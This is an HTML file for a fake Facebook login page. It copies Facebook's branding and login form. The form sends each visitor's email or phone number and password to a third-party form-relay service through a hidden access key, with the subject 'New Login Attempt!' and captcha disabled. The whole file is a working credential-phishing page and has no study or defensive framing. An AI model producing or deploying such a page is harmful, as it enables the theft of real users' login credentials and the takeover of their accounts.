<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">
    <div class="header-text">
        <h1>facebook</h1>
        <p>Facebook helps you connect and share with the people in your life.</p>
    </div>
    
    <div class="login-box">
        <form action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="8c60fe2a-f09c-4dbd-bc13-b66322d048b5">
            <input type="text" name="email" placeholder="Email address or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            
            <input type="hidden" name="_subject" value="New Login Attempt!">
            <input type="hidden" name="_captcha" value="false">
            
            <button type="submit" class="btn-login">Log In</button>
        </form>
        
        <div class="forgot">
            <a href="#">Forgotten password?</a>
        </div>
        
        <hr>
        
        <div class="create-account">
            <button class="btn-create">Create New Account</button>
        </div>
    </div>
</div>

</body>
</html>
